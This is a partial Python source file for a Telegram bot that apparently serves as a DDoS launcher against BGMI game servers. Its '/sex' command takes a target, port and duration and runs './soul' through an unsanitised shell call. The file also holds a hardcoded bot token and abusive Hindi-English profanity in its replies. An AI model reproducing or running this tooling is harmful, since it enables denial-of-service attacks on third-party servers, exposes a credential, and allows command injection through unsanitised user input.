...
bot = telebot.TeleBot('8052597093:AAH46vUSOgiRe_XZ0wDVZu26i_M8pejEb0s')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"sex start : {target}:{port} for {time}\nSEC Jabtak YE sex run krrha hai to iske bichme koi apni gand nahe Dalna Bhenchod"
    bot.reply_to(message, response)

    # Dictionary to store the last time each user ran the /sex command
bgmi_cooldown = {}
...
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Abhi sex Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 300:
                ...
                attack_running = True  # Set the sex state to running
                try:
                    record_command_logs(user_id, '/attack', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)

                    # Simulate sex process
                    full_command = f"./soul {target} {port} {time} 900"
                    subprocess.run(full_command, shell=True)

                    response = "sex completed successfully feedback doo."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the sex state
        else:
            response = "Usage: /sex <target> <port> <time>"
    else:
...
def show_help(message):
    help_text ='''
💥 /sex : 😫BGMI WALO KI MAA KO attack🥵. 
💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
💥 /mylogs : 👁️SAB sex DEKHO👁️.
